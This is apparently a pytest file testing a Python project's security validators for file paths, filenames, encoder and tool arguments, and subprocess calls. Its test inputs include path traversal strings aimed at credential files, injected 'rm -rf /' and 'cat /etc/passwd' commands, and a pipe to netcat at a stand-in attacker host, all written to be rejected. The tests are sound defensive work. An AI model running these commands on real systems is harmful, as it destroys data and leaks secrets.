"""
Tests for security validation utilities.

Tests the security validation and sanitization functions to ensure
proper protection against common vulnerabilities like command injection
and path traversal.
"""

import os
import pathlib
import tempfile
from unittest.mock import Mock, mock_open, patch

import pytest

from goesvfi.utils.security import (
    InputValidator,
    SecureFileHandler,
    SecurityError,
    secure_subprocess_call,
)


class TestSecurityError:
    """Test security error exception."""

    def test_security_error_creation(self):
        """Test creating security error."""
        error = SecurityError("Security validation failed")

        assert str(error) == "Security validation failed"
        assert isinstance(error, Exception)


class TestInputValidator:
    """Test input validation functionality."""

    def test_validate_file_path_valid_paths(self):
        """Test validation of valid file paths."""
        validator = InputValidator()

        valid_paths = [
            "/home/user/document.txt",
            "relative/path/file.png",
            "simple_file.jpg",
            "/var/log/app.log",
        ]

        for path in valid_paths:
            result = validator.validate_file_path(path)
            assert result is True

    def test_validate_file_path_invalid_inputs(self):
        """Test validation rejects invalid inputs."""
        validator = InputValidator()

        invalid_inputs: List[Any] = [
            "",  # Empty string
            None,  # None value
            123,  # Non-string
            [],  # List
        ]

        for invalid_input in invalid_inputs:
            with pytest.raises(SecurityError, match="Path must be a non-empty string"):
                validator.validate_file_path(invalid_input)  # type: ignore

    def test_validate_file_path_directory_traversal(self):
        """Test validation rejects directory traversal attempts."""
        validator = InputValidator()

        traversal_attempts = [
            "../../../etc/passwd",
            "safe/../../../etc/shadow",
            "/home/user/../../root/.ssh/id_rsa",
            "..\\..\\windows\\system32\\config\\sam",
        ]

        for attempt in traversal_attempts:
            with pytest.raises(SecurityError, match="directory traversal"):
                validator.validate_file_path(attempt)

    def test_validate_file_path_with_allowed_extensions(self):
        """Test validation with allowed extensions."""
        validator = InputValidator()

        # Valid extensions
        assert validator.validate_file_path("image.png", allowed_extensions=[".png", ".jpg"]) is True
        assert validator.validate_file_path("photo.JPG", allowed_extensions=[".png", ".jpg"]) is True

        # Invalid extensions
        with pytest.raises(SecurityError, match="File extension '.txt' not allowed"):
            validator.validate_file_path("document.txt", allowed_extensions=[".png", ".jpg"])

    def test_validate_file_path_must_exist(self):
        """Test validation when file must exist."""
        validator = InputValidator()

        # Test with temporary file
        with tempfile.NamedTemporaryFile() as temp_file:
            # File exists - should pass
            assert validator.validate_file_path(temp_file.name, must_exist=True) is True

        # File doesn't exist - should fail
        with pytest.raises(SecurityError, match="File does not exist"):
            validator.validate_file_path("/nonexistent/file.txt", must_exist=True)

    def test_validate_file_path_too_long(self):
        """Test validation rejects extremely long paths."""
        validator = InputValidator()

        long_path = "a" * 5000  # Path longer than reasonable limit

        with pytest.raises(SecurityError, match="Path too long"):
            validator.validate_file_path(long_path)

    def test_validate_numeric_range_valid_values(self):
        """Test numeric range validation with valid values."""
        validator = InputValidator()

        # Test integers
        assert validator.validate_numeric_range(5, 1, 10, "test_value") is True
        assert validator.validate_numeric_range(1, 1, 10, "boundary") is True
        assert validator.validate_numeric_range(10, 1, 10, "boundary") is True

        # Test floats
        assert validator.validate_numeric_range(3.14, 0.0, 5.0, "pi") is True
        assert validator.validate_numeric_range(0.0, 0.0, 1.0, "zero") is True

    def test_validate_numeric_range_invalid_types(self):
        """Test numeric range validation rejects non-numeric types."""
        validator = InputValidator()

        invalid_values: List[Any] = ["5", None, [], {}]

        for invalid_value in invalid_values:
            with pytest.raises(SecurityError, match="must be a number"):
                validator.validate_numeric_range(invalid_value, 1, 10, "test")  # type: ignore

    def test_validate_numeric_range_out_of_bounds(self):
        """Test numeric range validation rejects out-of-bounds values."""
        validator = InputValidator()

        # Too low
        with pytest.raises(SecurityError, match="must be between 1 and 10, got 0"):
            validator.validate_numeric_range(0, 1, 10, "too_low")

        # Too high
        with pytest.raises(SecurityError, match="must be between 1 and 10, got 15"):
            validator.validate_numeric_range(15, 1, 10, "too_high")

    def test_sanitize_filename_valid_names(self):
        """Test filename sanitization with valid names."""
        validator = InputValidator()

        test_cases = [
            ("normal_file.txt", "normal_file.txt"),
            ("file with spaces.jpg", "file with spaces.jpg"),
            ("file123.png", "file123.png"),
        ]

        for input_name, expected in test_cases:
            result = validator.sanitize_filename(input_name)
            assert result == expected

    def test_sanitize_filename_dangerous_characters(self):
        """Test filename sanitization removes dangerous characters."""
        validator = InputValidator()

        test_cases = [
            ("file<>name.txt", "file__name.txt"),
            ('file"name.jpg', "file_name.jpg"),
            ("file|name.png", "file_name.png"),
            ("file?name.gif", "file_name.gif"),
            ("file*name.bmp", "file_name.bmp"),
            ("file\\name.tiff", "file_name.tiff"),
            ("file/name.webp", "file_name.webp"),
            ("file:name.svg", "file_name.svg"),
        ]

        for input_name, expected in test_cases:
            result = validator.sanitize_filename(input_name)
            assert result == expected

    def test_sanitize_filename_edge_cases(self):
        """Test filename sanitization edge cases."""
        validator = InputValidator()

        # Empty filename
        assert validator.sanitize_filename("") == "untitled"
        assert validator.sanitize_filename(None) == "untitled"  # type: ignore

        # Only dots and spaces
        assert validator.sanitize_filename("...") == "untitled"
        assert validator.sanitize_filename("   ") == "untitled"
        assert validator.sanitize_filename(". . .") == "untitled"

        # Leading/trailing dots and spaces
        assert validator.sanitize_filename("  .file.txt.  ") == "file.txt"

    def test_sanitize_filename_length_limit(self):
        """Test filename sanitization enforces length limits."""
        validator = InputValidator()

        # Very long filename
        long_name = "a" * 300 + ".txt"
        result = validator.sanitize_filename(long_name)

        assert len(result) <= 255
        assert result.endswith(".txt")

    def test_validate_ffmpeg_encoder_allowed(self):
        """Test FFmpeg encoder validation with allowed encoders."""
        validator = InputValidator()

        allowed_encoders = [
            "Software x265",
            "Software x264",
            "Hardware HEVC (VideoToolbox)",
            "Hardware H.264 (VideoToolbox)",
            "None (copy original)",
        ]

        for encoder in allowed_encoders:
            assert validator.validate_ffmpeg_encoder(encoder) is True

    def test_validate_ffmpeg_encoder_not_allowed(self):
        """Test FFmpeg encoder validation rejects non-allowed encoders."""
        validator = InputValidator()

        forbidden_encoders = [
            "malicious_encoder",
            "unknown_codec",
            "; rm -rf /",
            "libx264; cat /etc/passwd",
        ]

        for encoder in forbidden_encoders:
            with pytest.raises(SecurityError, match="not allowed"):
                validator.validate_ffmpeg_encoder(encoder)

    def test_validate_sanchez_argument_allowed(self):
        """Test Sanchez argument validation with allowed parameters."""
        validator = InputValidator()

        valid_args = [
            ("res_km", "2.5"),
            ("false_colour", "true"),
            ("false_colour", "false"),
            ("crop", "100,200,300,400"),
            ("timestamp", "2023-12-25T12:00:00Z"),
            ("output", "output_file.png"),
            ("interpolate", "true"),
            ("brightness", "1.2"),
            ("brightness", "-0.5"),
            ("contrast", "1.0"),
            ("saturation", "0.8"),
        ]

        for key, value in valid_args:
            assert validator.validate_sanchez_argument(key, value) is True

    def test_validate_sanchez_argument_not_allowed_key(self):
        """Test Sanchez argument validation rejects non-allowed keys."""
        validator = InputValidator()

        with pytest.raises(SecurityError, match="not allowed"):
            validator.validate_sanchez_argument("malicious_key", "value")

    def test_validate_sanchez_argument_invalid_value(self):
        """Test Sanchez argument validation rejects invalid values."""
        validator = InputValidator()

        invalid_args = [
            ("res_km", "not_a_number"),
            ("false_colour", "maybe"),
            ("crop", "invalid_crop"),
            ("timestamp", "invalid_date"),
            ("brightness", "very_bright"),
        ]

        for key, value in invalid_args:
            with pytest.raises(SecurityError, match="invalid value"):
                validator.validate_sanchez_argument(key, value)

    def test_validate_command_args_valid(self):
        """Test command argument validation with safe arguments."""
        validator = InputValidator()

        safe_args = [
            ["ffmpeg", "-i", "input.mp4", "output.mp4"],
            ["convert", "image.jpg", "-resize", "50%", "resized.jpg"],
            ["ls", "-la", "/home/user"],
        ]

        for args in safe_args:
            assert validator.validate_command_args(args) is True

    def test_validate_command_args_too_many(self):
        """Test command argument validation rejects too many arguments."""
        validator = InputValidator()

        too_many_args = ["cmd"] + ["arg"] * 150  # More than default limit

        with pytest.raises(SecurityError, match="Too many command arguments"):
            validator.validate_command_args(too_many_args)

    def test_validate_command_args_dangerous_patterns(self):
        """Test command argument validation rejects dangerous patterns."""
        validator = InputValidator()

        dangerous_args = [
            ["ls", "; rm -rf /"],  # Command chaining
            ["cat", "file | nc attacker.com 1234"],  # Pipe to network
            ["echo", "$(cat /etc/passwd)"],  # Command substitution
            ["ls", "&& rm important_file"],  # Command chaining
            ["cat", "file`whoami`"],  # Command substitution
            ["echo", "\\x41\\x42\\x43"],  # Hex escape sequences
            ["curl", "http://example.com/%2e%2e%2fpasswd"],  # URL encoding
        ]

        for args in dangerous_args:
            with pytest.raises(SecurityError, match="Dangerous pattern found"):
                validator.validate_command_args(args)

    def test_validate_command_args_non_string(self):
        """Test command argument validation rejects non-string arguments."""
        validator = InputValidator()

        with pytest.raises(SecurityError, match="must be string"):
            validator.validate_command_args(["ls", 123, "file"])  # type: ignore


class TestSecureFileHandler:
    """Test secure file handling functionality."""

    def test_create_secure_temp_file(self):
        """Test creation of secure temporary files."""
        handler = SecureFileHandler()

        temp_path = handler.create_secure_temp_file(suffix=".txt", prefix="test_")

        try:
            assert temp_path.exists()
            assert temp_path.name.startswith("test_")
            assert temp_path.name.endswith(".txt")

            # Check permissions (owner read/write only)
            stat_info = temp_path.stat()
            assert stat_info.st_mode & 0o777 == 0o600
        finally:
            if temp_path.exists():
                temp_path.unlink()

    def test_create_secure_temp_file_defaults(self):
        """Test creation of secure temporary files with defaults."""
        handler = SecureFileHandler()

        temp_path = handler.create_secure_temp_file()

        try:
            assert temp_path.exists()
            assert temp_path.name.startswith("goesvfi_")
        finally:
            if temp_path.exists():
                temp_path.unlink()

    @patch("pathlib.Path.mkdir")
    @patch("pathlib.Path.chmod")
    def test_create_secure_config_dir(self, mock_chmod, mock_mkdir):
        """Test creation of secure configuration directory."""
        handler = SecureFileHandler()
        config_dir = pathlib.Path("/test/config")

        handler.create_secure_config_dir(config_dir)

        mock_mkdir.assert_called_once_with(parents=True, exist_ok=True)
        mock_chmod.assert_called_once_with(0o700)


class TestSecureSubprocessCall:
    """Test secure subprocess execution."""

    @patch("subprocess.run")
    def test_secure_subprocess_call_success(self, mock_run):
        """Test successful secure subprocess call."""
        mock_result = Mock()
        mock_run.return_value = mock_result

        command = ["ls", "-la", "/home/user"]
        result = secure_subprocess_call(command)

        assert result == mock_result
        mock_run.assert_called_once_with(
            command,
            shell=False,
            check=True,
            capture_output=True,
            text=True,
            timeout=300,
        )

    @patch("subprocess.run")
    def test_secure_subprocess_call_with_custom_timeout(self, mock_run):
        """Test secure subprocess call with custom timeout."""
        mock_result = Mock()
        mock_run.return_value = mock_result

        command = ["sleep", "10"]
        result = secure_subprocess_call(command, timeout=60)

        assert result == mock_result
        mock_run.assert_called_once_with(command, shell=False, check=True, capture_output=True, text=True, timeout=60)

    def test_secure_subprocess_call_dangerous_command(self):
        """Test secure subprocess call rejects dangerous commands."""
        dangerous_commands = [
            ["ls", "; rm -rf /"],
            ["echo", "$(cat /etc/passwd)"],
            ["cat", "file | nc attacker.com 1234"],
        ]

        for command in dangerous_commands:
            with pytest.raises(SecurityError, match="Dangerous pattern found"):
                secure_subprocess_call(command)

    def test_secure_subprocess_call_shell_not_allowed(self):
        """Test secure subprocess call prevents shell execution."""
        command = ["ls", "/"]

        with pytest.raises(SecurityError, match="Shell execution not allowed"):
            secure_subprocess_call(command, shell=True)

    @patch("subprocess.run")
    def test_secure_subprocess_call_timeout_error(self, mock_run):
        """Test secure subprocess call handles timeouts."""
        import subprocess

        mock_run.side_effect = subprocess.TimeoutExpired("cmd", 30)

        command = ["sleep", "60"]

        with pytest.raises(SecurityError, match="Command timed out after 30 seconds"):
            secure_subprocess_call(command, timeout=30)

    @patch("subprocess.run")
    def test_secure_subprocess_call_other_exception(self, mock_run):
        """Test secure subprocess call handles other exceptions."""
        mock_run.side_effect = OSError("Permission denied")

        command = ["restricted_command"]

        with pytest.raises(OSError, match="Permission denied"):
            secure_subprocess_call(command)


class TestSecurityIntegration:
    """Integration tests for security functionality."""

    def test_comprehensive_input_validation(self):
        """Test comprehensive input validation scenario."""
        validator = InputValidator()

        # Simulate validating user inputs for a file processing operation
        file_path = "user_upload/image.jpg"
        quality = 85
        encoder = "Software x264"

        # All validations should pass
        assert validator.validate_file_path(file_path, allowed_extensions=validator.ALLOWED_IMAGE_EXTENSIONS) is True

        assert validator.validate_numeric_range(quality, 1, 100, "quality") is True
        assert validator.validate_ffmpeg_encoder(encoder) is True

        # Sanitize the filename
        safe_filename = validator.sanitize_filename("user file<>name.jpg")
        assert safe_filename == "user file__name.jpg"

    def test_attack_scenario_prevention(self):
        """Test prevention of various attack scenarios."""
        validator = InputValidator()

        # Path traversal attack
        with pytest.raises(SecurityError):
            validator.validate_file_path("../../../etc/passwd")

        # Command injection via FFmpeg encoder
        with pytest.raises(SecurityError):
            validator.validate_ffmpeg_encoder("libx264; rm -rf /")

        # Command injection via Sanchez arguments
        with pytest.raises(SecurityError):
            validator.validate_sanchez_argument("output", "file.png; cat /etc/passwd")

        # Command injection via subprocess arguments
        with pytest.raises(SecurityError):
            validator.validate_command_args(["convert", "image.jpg", "; rm important_file"])

    def test_secure_file_operations(self):
        """Test secure file operations."""
        handler = SecureFileHandler()

        # Create secure temporary file
        temp_file = handler.create_secure_temp_file(suffix=".test")

        try:
            # Verify it's secure
            assert temp_file.exists()
            stat_info = temp_file.stat()
            assert stat_info.st_mode & 0o777 == 0o600  # Owner read/write only

            # Test writing to it
            temp_file.write_text("test content")
            assert temp_file.read_text() == "test content"

        finally:
            if temp_file.exists():
                temp_file.unlink()

    @patch("subprocess.run")
    def test_secure_external_tool_execution(self, mock_run):
        """Test secure execution of external tools."""
        mock_run.return_value = Mock()

        # Safe command execution
        safe_command = ["ffmpeg", "-i", "input.mp4", "-c:v", "libx264", "output.mp4"]

        # Should succeed
        result = secure_subprocess_call(safe_command)
        assert result is not None

        # Verify security parameters
        call_args = mock_run.call_args
        kwargs = call_args[1]
        assert kwargs["shell"] is False
        assert kwargs["check"] is True
        assert "timeout" in kwargs

    def test_complete_security_workflow(self):
        """Test complete security validation workflow."""
        validator = InputValidator()

        # Simulate processing user-provided parameters
        user_inputs = {
            "input_file": "user_image.png",
            "output_file": "processed<>image.jpg",
            "quality": 90,
            "encoder": "Software x265",
            "sanchez_res": "2.0",
            "command_args": ["convert", "input.png", "output.jpg"],
        }

        # Validate and sanitize all inputs
        validated_inputs = {}

        # Validate input file
        validated_inputs["input_file"] = user_inputs["input_file"]
        assert (
            validator.validate_file_path(
                validated_inputs["input_file"],  # type: ignore
                allowed_extensions=validator.ALLOWED_IMAGE_EXTENSIONS,
            )
            is True
        )

        # Sanitize output filename
        validated_inputs["output_file"] = validator.sanitize_filename(user_inputs["output_file"])  # type: ignore
        assert validated_inputs["output_file"] == "processed__image.jpg"

        # Validate quality parameter
        assert validator.validate_numeric_range(user_inputs["quality"], 1, 100, "quality") is True  # type: ignore
        validated_inputs["quality"] = user_inputs["quality"]

        # Validate encoder
        assert validator.validate_ffmpeg_encoder(user_inputs["encoder"]) is True  # type: ignore
        validated_inputs["encoder"] = user_inputs["encoder"]

        # Validate Sanchez parameters
        assert validator.validate_sanchez_argument("res_km", user_inputs["sanchez_res"]) is True
        validated_inputs["sanchez_res"] = user_inputs["sanchez_res"]

        # Validate command arguments
        assert validator.validate_command_args(user_inputs["command_args"]) is True  # type: ignore
        validated_inputs["command_args"] = user_inputs["command_args"]

        # All inputs should now be safe for processing
        assert len(validated_inputs) == len(user_inputs)
        assert all(key in validated_inputs for key in user_inputs.keys())
